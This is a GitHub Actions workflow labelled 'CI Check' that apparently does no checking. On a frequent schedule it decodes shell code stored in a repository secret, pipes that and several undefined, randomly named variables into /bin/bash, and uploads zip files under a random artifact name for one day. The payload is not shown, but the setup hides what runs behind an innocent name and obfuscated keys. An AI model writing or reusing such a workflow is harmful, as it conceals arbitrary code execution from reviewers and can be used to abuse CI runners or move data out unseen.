name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '29 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          el7147: ${{ secrets.el7147 }}
        run: |
          printf '%s' "$el7147" | jq -r .gv4 | /bin/bash
          echo $byzy34 | jq -r .o405 | /bin/bash
          echo $sxzl943 | jq -r .h4465 | /bin/bash
          echo $ulg8 | jq -r .sigqc630 | /bin/bash
          printf '%s' "$mrm65" | jq -r .ntk78465 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: y4kHe1SB
          path: "*.zip"
          retention-days: 1
